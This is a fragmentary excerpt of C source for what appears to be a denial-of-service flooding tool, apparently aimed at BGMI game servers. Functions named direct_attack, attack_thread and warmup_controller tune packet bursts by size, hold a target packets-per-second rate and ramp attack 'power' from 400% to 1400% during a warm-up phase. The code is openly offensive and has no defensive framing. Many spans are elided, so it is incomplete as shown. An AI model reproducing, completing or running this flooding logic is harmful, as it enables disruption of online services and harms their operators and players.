...
int get_warmup_multiplier(int phase) {
    int warmup_phases[] = {400, 800, 1200, 1400};
    if (phase >= 0 && phase < 4) {
...
int get_base_burst(int packet_size) {
    if (packet_size <= 24) return 100;
    if (packet_size <= 28) return 96;
    if (packet_size <= 32) return 92;
    if (packet_size <= 36) return 88;
    if (packet_size <= 40) return 84;
    if (packet_size <= 44) return 80;
    if (packet_size <= 48) return 76;
    if (packet_size <= 52) return 72;
    if (packet_size <= 56) return 68;
    if (packet_size <= 60) return 64;
    if (packet_size <= 64) return 60;
    if (packet_size <= 72) return 54;
    return 46;
}
...
void *direct_attack(void *arg) {
    ...
    while (!atomic_load(&stop_signal)) {
        ...
        if (curr_pps > 0) {
            if (curr_pps < target_pps * 0.96) {
                dynamic_burst = base_burst * 1.02;
            } else if (curr_pps > target_pps * 1.04) {
                dynamic_burst = base_burst * 0.98;
            }
        }
        
        dynamic_burst = (dynamic_burst * power_level) / 100;
        
        if (dynamic_burst > base_burst * 1.08) {
            dynamic_burst = base_burst * 1.08;
        }
        if (dynamic_burst < base_burst * 0.92) {
            dynamic_burst = base_burst * 0.92;
        }
...
void *attack_thread(void *arg) {
    ...
    create_bgmi_packet(packet, MAX_PACKET_SIZE, tid, 0, &seed, 1);
    for (int j = 0; j < 500; j++) {
...
void *warmup_controller(void *arg) {
    ...
    printf("⚡ Warm-up: %d seconds (400%% → 1400%% power)...\n", WARMUP_SECONDS);
    
    atomic_store(&should_attack, 1);
    
    for (int phase = 0; phase < 4 && !atomic_load(&stop_signal); phase++) {
...
int main(int argc, char *argv[]) {
    ...
    printf("🔥 Warm-up: 3 seconds (400%% → 1400%%)\n");
    printf("===============================================\n");
